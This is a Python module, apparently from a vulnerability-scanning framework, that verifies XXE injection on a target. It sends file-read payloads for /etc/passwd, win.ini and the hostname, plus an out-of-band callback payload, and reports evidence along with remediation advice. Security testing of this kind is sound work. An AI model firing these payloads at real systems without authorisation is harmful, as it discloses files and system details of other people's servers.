#!/usr/bin/env python3
"""
XXE Verifier
============
Multi-stage:
  Stage 1: Basic file read (Linux + Windows)
  Stage 2: OAST callback (blind XXE)
"""
import re

from ..base_verifier import BaseVerifier
from ..models import VerifiedFinding, VerificationEvidence


class XXEVerifier(BaseVerifier):
    VULN_TYPE = "XXE"
    VULN_TITLE = "XML External Entity Injection"
    DEFAULT_SEVERITY = "high"
    DEFAULT_CWE = "CWE-611"
    DEFAULT_CVSS = 7.5
    DEFAULT_CVSS_VECTOR = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    DEFAULT_REMEDIATION = (
        "Disable external entity processing in XML parsers. Use "
        "defusedxml or set DTD processing to disabled. Validate XML "
        "against schemas."
    )

    FILE_PAYLOADS = [
        ('<?xml version="1.0"?>'
         '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
         '<r>&xxe;</r>',
         r"root:.*?:0:0:", "Linux /etc/passwd"),
        ('<?xml version="1.0"?>'
         '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
         '<r>&xxe;</r>',
         r"\[fonts\]", "Windows win.ini"),
        ('<?xml version="1.0"?>'
         '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
         '<r>&xxe;</r>',
         r"^[a-zA-Z0-9][\w\-]+$", "Hostname"),
    ]

    def __init__(self, http_client, config=None):
        super().__init__(http_client, config)
        self.oast = (config or {}).get("_oast")

    def verify(self, url, param, method="GET", form_data=None):
        self.steps = []
        all_evidence = []
        extracted = {}
        key_exchange = None
        confidence = 0.0        # ── Stage 1: File read ───────────────────────────────────────────
        step = self.start_step(
            "file_read",
            "Testing XXE file disclosure",
            stage="detection",
        )
        for payload, pattern, desc in self.FILE_PAYLOADS:
            ex = self._send_xml(url, payload)
            if not ex or ex.response_status == 0:
                continue
            m = re.search(pattern, ex.response_body or "", re.I | re.M)
            if m:
                ev = VerificationEvidence(
                    type="xxe_file_read",
                    title=f"XXE file disclosure ({desc})",
                    description=f"File content revealed via XXE: {desc}",
                    payload=payload,
                    extracted_data={
                        "file": desc,
                        "content": m.group(0)[:300],
                    },
                    exchange=ex,
                    confidence=0.95,
                )
                all_evidence.append(ev)
                extracted[desc] = m.group(0)[:300]
                self.finish_step(step, "passed", payload=payload,
                                details=desc, evidence=[ev])
                confidence = 0.95
                key_exchange = ex
                break
        if confidence == 0:
            self.finish_step(step, "failed",
                            details="No file disclosure via XXE")

        # ── Stage 2: OAST callback ───────────────────────────────────────
        if confidence < 0.9 and self.oast:
            step = self.start_step(
                "oast_callback",
                "Testing XXE via out-of-band callback",
                stage="detection",
            )
            try:
                token = self.oast.generate_token()
                oast_url = self.oast.get_url(token)
                payload = (
                    '<?xml version="1.0"?>'
                    f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "{oast_url}">]>'
                    '<r>&xxe;</r>'
                )
                ex = self._send_xml(url, payload)
                interactions = self.oast.poll(token, timeout=10)
                if interactions:
                    ev = VerificationEvidence(
                        type="xxe_oast",
                        title="XXE OAST callback",
                        description=(
                            f"Target parsed XML and contacted our OAST "
                            f"server from {interactions[0].get('source_ip')}"
                        ),
                        payload=payload,
                        extracted_data={
                            "source_ip": interactions[0].get('source_ip'),
                            "user_agent": interactions[0].get('user_agent', ''),
                        },
                        exchange=ex,
                        confidence=0.98,
                    )
                    all_evidence.append(ev)
                    extracted["oast"] = interactions[0].get('source_ip')
                    self.finish_step(step, "passed", payload=payload,
                                    details="OAST callback received",
                                    evidence=[ev])
                    confidence = 0.98
                    if not key_exchange:
                        key_exchange = ex
                else:
                    self.finish_step(step, "failed",
                                    details="No OAST callback")
            except Exception as e:
                self.finish_step(step, "error", details=str(e))

        if confidence >= 0.85:
            methods = [s.name for s in self.steps if s.status == "passed"]
            return self.build_finding(
                url=url, param=param,
                confidence=confidence,
                description=f"XXE verified. Extracted: {extracted}",
                methods=methods,
                extracted_info=extracted,
                key_exchange=key_exchange,
            )
        return None

    def _send_xml(self, url, payload):
        try:
            return self.http.post(
                url,
                data=payload,
                headers={"Content-Type": "application/xml"},
            )
        except Exception:
            return None